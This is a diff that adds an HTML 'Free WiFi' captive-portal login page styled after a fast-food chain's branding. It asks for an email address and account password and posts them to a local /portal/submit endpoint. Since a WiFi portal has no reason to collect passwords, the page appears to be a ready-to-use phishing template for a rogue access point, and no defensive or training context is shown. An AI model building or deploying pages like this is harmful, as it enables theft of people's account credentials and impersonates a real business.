@@ -1,0 +1,42 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Free WiFi</title>
+<style>
+  html, body { margin:0; padding:0; height:100%; font-family:"Speedee","Helvetica Neue",Helvetica,Arial,sans-serif; background:#ffc72c; color:#292929; }
+  body { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; box-sizing:border-box; }
+  .card { background:#fff; border-radius:12px; box-shadow:0 8px 30px rgba(0,0,0,0.12); width:min(420px, 100%); padding:36px 32px; text-align:center; }
+  .logo { font-size:44px; font-weight:700; color:#da291c; margin:0 0 2px; letter-spacing:-1px; }
+  h1 { font-size:20px; font-weight:700; margin:8px 0 4px; color:#292929; }
+  .sub { color:#6b6b6b; font-size:13px; margin-bottom:22px; }
+  .form-row { margin:10px 0; text-align:left; }
+  label { display:block; font-size:11px; color:#6b6b6b; text-transform:uppercase; font-weight:600; margin-bottom:4px; }
+  input { width:100%; padding:12px 14px; font-size:14px; border:2px solid #e5e5e5; border-radius:8px; box-sizing:border-box; background:#fff; }
+  input:focus { outline:none; border-color:#ffc72c; }
+  button { width:100%; padding:14px; margin-top:18px; background:#da291c; color:#fff; border:none; border-radius:999px; font-size:15px; font-weight:700; cursor:pointer; text-transform:uppercase; letter-spacing:0.5px; }
+  button:hover { background:#a91a10; }
+  .fine { margin-top:16px; font-size:10px; color:#8a8a8a; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">M</div>
+  <h1>Free WiFi</h1>
+  <div class="sub">Sign in to enjoy fast, free internet while you visit.</div>
+  <form method="POST" action="/portal/submit">
+    <div class="form-row">
+      <label for="email">Email</label>
+      <input type="email" id="email" name="email" required>
+    </div>
+    <div class="form-row">
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required>
+    </div>
+    <button type="submit">Get Connected</button>
+  </form>
+  <div class="fine">By continuing you accept our WiFi terms.</div>
+</div>
+</body>
+</html>
